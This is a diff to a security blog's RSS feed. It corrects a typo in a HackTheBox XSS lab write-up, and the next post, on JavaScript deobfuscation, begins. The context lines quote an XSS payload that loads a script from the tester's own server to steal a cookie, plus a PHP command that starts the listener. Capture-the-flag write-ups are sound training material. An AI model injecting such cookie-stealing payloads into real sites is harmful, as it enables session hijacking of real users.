@@ -39,7 +39,7 @@ if (isset($_GET[&apos;c&apos;])) {
 &lt;code&gt;sudo php -S 0.0.0.0:PORT&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;And used the payload in the vulnerable field:&lt;br /&gt;
 &lt;code&gt;&amp;lt;script src=http://10.10.14.223:8089/script.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;This gave as the cookie and the flag.&lt;/p&gt;
+&lt;p&gt;This gave us the cookie and the flag.&lt;/p&gt;
 </content:encoded></item><item><title>Skills Assessment - JavaScript Deobfuscation - HackTheBox.</title><link>https://alan.com.ar/posts/javascriptdeobfuscation/</link><guid isPermaLink="true">https://alan.com.ar/posts/javascriptdeobfuscation/</guid><pubDate>Thu, 23 Oct 2025 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
 &lt;p&gt;In this module, you will learn the basics of deobfuscating and decoding JavaScript code and will have several exercises to practice what you learned.&lt;/p&gt;
 &lt;/blockquote&gt;
